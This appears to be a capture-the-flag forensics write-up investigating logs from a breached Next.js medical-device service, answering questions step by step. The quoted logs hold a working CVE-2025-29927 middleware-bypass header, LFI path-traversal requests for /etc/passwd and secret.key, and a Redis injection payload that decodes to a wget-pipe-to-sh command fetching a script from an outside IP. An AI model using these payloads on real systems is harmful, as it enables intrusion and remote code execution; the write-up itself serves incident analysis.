# NeuroSync-D

#API #linux #logs #access.log

## Speech
> NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.

## Analysis
We have these files:
```
total 486332
-rw-r----- 1 kali kali     24835 Apr  1 07:42 access.log
-rw-r--r-- 1 kali kali      2617 Apr  1 07:41 bci-device.log
-rw-r--r-- 1 kali kali     27914 Apr  1 07:41 data-api.log
-rw-r--r-- 1 kali kali      8397 Apr  1 07:41 interface.log
-rw-r--r-- 1 kali kali      7209 Apr  1 07:41 redis.log
```

## Questions
1. What version of Next.js is the application using?
    > 15.1.0
    - Top of the **Interface.log** file
2. What local port is the Next.js-based application running on?
    > 3000
    - idem as 1
3. A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?
    > CVE-2025-29927
    - Search online for vulnerability released in march 2025 against next.js 15.1.0
4. The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?
    > main-app.js
    - Look at the first line of **access.log**:
    ```
    10.129.231.211 - - [01/Apr/2025:11:37:17 +0000] "GET / HTTP/1.1" 200 8486 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
    10.129.231.211 - - [01/Apr/2025:11:37:35 +0000] "GET /_next/static/chunks/framework.js HTTP/1.1" 404 9321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
    10.129.231.211 - - [01/Apr/2025:11:37:38 +0000] "GET /_next/static/chunks/main.js HTTP/1.1" 404 9318 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
    10.129.231.211 - - [01/Apr/2025:11:37:40 +0000] "GET /_next/static/chunks/commons.js HTTP/1.1" 404 9319 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
    10.129.231.211 - - [01/Apr/2025:11:37:44 +0000] "GET /_next/static/chunks/main-app.js HTTP/1.1" 200 1375579 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
    10.129.231.211 - - [01/Apr/2025:11:37:47 +0000] "GET /_next/static/chunks/app/page.js HTTP/1.1" 200 64640 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
    ```
    - The first one with code 200 (success) is main-app.js
5. Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?
    > /api/bci/analytics
    - **interface.log**, only one endpoint requested
6. How many requests to this endpoint have resulted in an "Unauthorized" response?
    > 5
    - count the 401 code in **access.log**
7. When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?
    > 2025-04-01 11:38:05
    - first HTTP code 200 in **access.log**: `10.129.231.211 - - [01/Apr/2025:11:38:05 +0000] "GET /api/bci/analytics HTTP/1.1" 200 737 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"`
8. Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?
    > x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
    - In **interface.log** we have this:
    ```
    2025-04-01T11:37:58.163Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-real-ip","10.129.231.211"]]
    2025-04-01T11:37:59.699Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware"],["x-real-ip","10.129.231.211"]]
    2025-04-01T11:38:01.280Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware:middleware"],["x-real-ip","10.129.231.211"]]
    2025-04-01T11:38:02.486Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware:middleware:middleware"],["x-real-ip","10.129.231.211"]]
    2025-04-01T11:38:04.111Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware:middleware:middleware:middleware"],["x-real-ip","10.129.231.211"]]
    ```
    - From the previous search about the vulnerability we know the vulnerability stems in the *x-middleware-subrequest* header, and with these lines we can see that the attacker try to exploit each time with one more "middleware:"
9. The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?
    > 4000
    - In **data-api.log**
10. After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?
    > /logs
    - In **data-api.log**, only one endpoint
11. When the vulnerable endpoint found was used maliciously for the first time?
    > 2025-04-01 11:39:01
    - In **data-api.log**: We notice multiple LFI: `2025-04-01 11:39:01 [VERBOSE] Incoming request: GET /logs?logFile=/var/log/../.../...//../.../...//etc/passwd from ::ffff:127.0.0.1`
12. What is the attack name the endpoint is vulnerable to?
    > Local File Inclusion
    - :)
13. What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?
    > secret.key
    - In **data-api.log**, last LFI request
14. Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
    > OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
    - In the **redis.log** file we have that
15. Once decoded, what is the command?
    > wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
    - In the **bci-device.log** file or by decoding the previous payload